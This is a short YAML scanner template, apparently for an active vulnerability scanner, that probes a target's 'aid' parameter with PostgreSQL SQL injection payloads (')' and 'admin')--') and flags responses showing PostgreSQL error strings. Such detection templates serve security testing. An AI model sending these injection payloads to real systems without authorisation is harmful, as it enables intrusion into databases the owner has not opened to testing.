id: sqli3-pg-09
name: 'SQLi pg prefix #8 in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - ')'
        - 'admin'')--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
